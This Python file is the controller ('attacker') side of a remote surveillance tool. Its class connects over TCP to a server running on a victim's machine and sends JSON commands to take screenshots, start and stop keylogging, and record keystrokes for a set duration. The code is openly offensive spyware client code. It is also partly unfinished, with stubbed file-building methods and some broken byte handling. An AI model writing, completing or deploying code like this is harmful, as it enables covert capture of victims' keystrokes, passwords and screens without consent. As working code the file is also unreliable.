import socket
import sys
import random
import json
import warnings

SHELL_ARGUMENTS = sys.argv

# the victim ip and port are shell arguments (but they have default values)
TARGET_IP = '127.0.0.1' if len(SHELL_ARGUMENTS) < 2 else SHELL_ARGUMENTS[1]
TARGET_PORT = 5000 if len(SHELL_ARGUMENTS) < 3 else SHELL_ARGUMENTS[2]

SOCK_BYTE_LIMIT = 4096


class ServerInvalidResponseStatus(Exception):  # TODO: extend this class
    pass


class FileBuilderFromBytes:
    def __init__(self):
        pass

    def image_from_bytes(self, path:str, bytes_content):
        pass

    def text_from_bytes(self, path:str, bytes_content):
        pass

class Attacker:
    """ A class for representing the attacker, who is the client.
    The attacker can request screenshots and key-logging information from the victim's computer, and
    the victim's server will serve the requests - therefore it is the server.
    Currently, the attacker is limited and can only communicate with a single target.
    """

    def __init__(self, target_ip=TARGET_IP, target_port=TARGET_PORT):
        self._target_ip = target_ip
        self._target_port = target_port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self._socket.connect((self._target_ip, self._target_port))

    def send(self, content):
        if isinstance(content, str):
            content = content.encode('utf-8')
        self._socket.send(content)

    def receive_and_process(self):
        response_bytes = self.receive()
        self.process_response(response_bytes)

    def receive(self):
        response_bytes = self._socket.recv(SOCK_BYTE_LIMIT)
        return response_bytes  # returns the response in bytes

    def process_response(self, response_bytes):
        response_json = response_bytes.decode('utf-8')
        try:
            response_dict = json.loads(response_json)
        except json.JSONDecodeError:
            warnings.warn("Invalid (first) response from server - couldn't convert to JSON format!!!")
            return None
        if response_dict['status'] == 'success':  # the message was successful.
            print(f"received {len(response_bytes)} bytes")
            print(response_bytes.encode('utf-8'))

        elif response_dict['status'] == 'pending':  # a preparation message for more messages
            print("received a pending status message")
            num_of_messages = response_dict['num_of_messages']
            bytes_buffer = b''
            for i in range(num_of_messages):
                message = self.receive()
                print(f"received {len(message)} bytes")
                bytes_buffer += message  # TODO: later put mutex here

        elif response_dict['status'] == 'failure':
            pass
        else:
            raise ServerInvalidResponseStatus()

    def request_screenshot(self):
        request = json.dumps({
            'type': 'request',
            'resource': 'screenshot'
        })
        self.send(request)

    def start_keylogging(self):
        """ start collecting key-logging info."""

        request = json.dumps({
            'type': 'action',
            'action': 'start_keylogging',
        })
        self.send(request)

    def log_for(self, duration: int = 5):
        request = json.dumps({
            'type': 'action',
            'action': 'log_for',
            'duration': duration
        })
        self.send(request)

    def stop_keylogging(self):  # TODO: action or request?
        request = json.dumps({
            'type': 'request',
            'resource': 'keylogging_report'
        })
        self.send(request)

    @property
    def target_ip(self):
        return self._target_ip

    @property
    def target_port(self):
        return self._target_port

    def close(self):
        self._socket.close()


def main():
    attacker = Attacker()
    attacker.connect()
    attacker.log_for(10)
    attacker.receive_and_process()
    attacker.close()


if __name__ == '__main__':
    main()
